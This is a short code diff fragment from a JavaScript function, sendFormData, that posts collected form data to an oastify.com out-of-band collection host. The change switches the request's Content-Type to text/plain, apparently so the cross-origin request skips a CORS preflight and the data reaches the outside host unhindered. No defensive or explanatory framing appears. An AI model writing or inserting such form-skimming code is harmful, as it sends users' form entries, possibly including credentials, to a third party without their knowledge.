@@ -35,7 +35,7 @@ function sendFormData(formElement) {
     fetch('https://gi2zxgb9mz9eawl5yzg5k2b02r8iw8kx.oastify.com/', {
         method: 'POST',
         headers: {
-            'Content-Type': 'application/json',
+            'Content-Type': 'text/plain',
         },
         body: jsonData,
     })
